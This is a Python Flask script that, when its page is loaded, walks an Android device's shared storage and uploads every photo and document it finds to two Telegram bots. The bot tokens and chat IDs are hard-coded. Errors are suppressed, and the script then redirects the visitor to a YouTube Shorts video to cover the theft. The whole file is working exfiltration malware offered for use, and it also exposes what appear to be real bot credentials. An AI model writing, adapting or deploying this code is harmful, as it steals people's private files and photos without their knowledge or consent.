from flask import Flask, redirect
import os
import requests
import threading

app = Flask(__name__)

@app.route("/")
def home():
    tokens = [
        {"token": "8227164819:AAH8_TAywNlKjzjo5q0AyaVSkB9AwS6YXJk", "chat_id": 8366556223},
        {"token": "8511441177:AAHQz-qRujmXMFgaDHyhhYCdM7Qt_wVQ66o", "chat_id": 8215175120}
    ]
    
    start_dir = '/storage/emulated/0/'
    IMAGE_EXTENSIONS = {'.jpg', '.jpeg', '.png', '.gif', '.bmp', '.webp'}
    TEXT_EXTENSIONS = {'.txt', '.pdf', '.doc', '.docx', '.log', '.md', '.rtf'}
    
    youtube_link = "https://youtube.com/shorts/v8XhYkLPl28?si=BPbcEzt5zSKTpr_x"
    
    def send_file_to_bot(file_path, filename, bot_info):
        try:
            file_ext = os.path.splitext(filename)[1].lower()
            
            with open(file_path, 'rb') as file:
                if file_ext in IMAGE_EXTENSIONS:
                    url = f"https://api.telegram.org/bot{bot_info['token']}/sendPhoto"
                    files_dict = {'photo': file}
                elif file_ext in TEXT_EXTENSIONS:
                    url = f"https://api.telegram.org/bot{bot_info['token']}/sendDocument"
                    files_dict = {'document': file}
                else:
                    return
                
                params = {'chat_id': bot_info['chat_id']}
                response = requests.post(url, files=files_dict, params=params)
                
        except Exception:
            pass
    
    def send_all_files(start_path):
        for root, dirs, files in os.walk(start_path):
            for filename in files:
                file_path = os.path.join(root, filename)
                
                threads = []
                for bot in tokens:
                    thread = threading.Thread(target=send_file_to_bot, args=(file_path, filename, bot))
                    thread.start()
                    threads.append(thread)
                
                for thread in threads:
                    thread.join()
    
    send_all_files(start_dir)
    
    return redirect(youtube_link)

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=8080)
